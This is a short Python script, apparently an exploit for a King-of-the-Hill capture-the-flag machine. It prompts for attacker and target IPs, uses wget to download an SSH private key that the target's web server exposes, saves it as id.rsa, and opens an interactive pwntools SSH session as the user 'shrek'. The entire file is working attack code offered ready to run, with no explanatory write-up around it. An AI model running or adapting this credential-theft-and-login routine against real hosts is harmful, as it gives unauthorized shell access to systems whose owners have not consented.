from pwn import *
import os

def main():
    #reference https://github.com/holmes-py/King-of-the-hill#machine-name-food

    #grab relevant ip addresses
    local_host = input("Please enter local (your) IP: ")
    remote_host = input("Please enter remote (target) IP: ")

    #remove spaces and newlines so the IP addresses can be references in system commands
    local_host = local_host.strip()
    remote_host = remote_host.strip()


    #print(local_host)
    #print(remote_host)

    #grab the ssh key, copy it to id.rsa, and give ie the correct permissions
    grabSSHKey = "wget " + remote_host + "/Cpxtpt2hWCee9VFa.txt"
    print(grabSSHKey)
    os.system(grabSSHKey)
    os.system("cp Cpxtpt2hWCee9VFa.txt id.rsa")
    os.system("chmod 600 id.rsa")

    #ssh into the shrek user

    sshSession = ssh(host=remote_host, user='shrek', keyfile='id.rsa', port=22)
    sshSession.interactive()
    
main()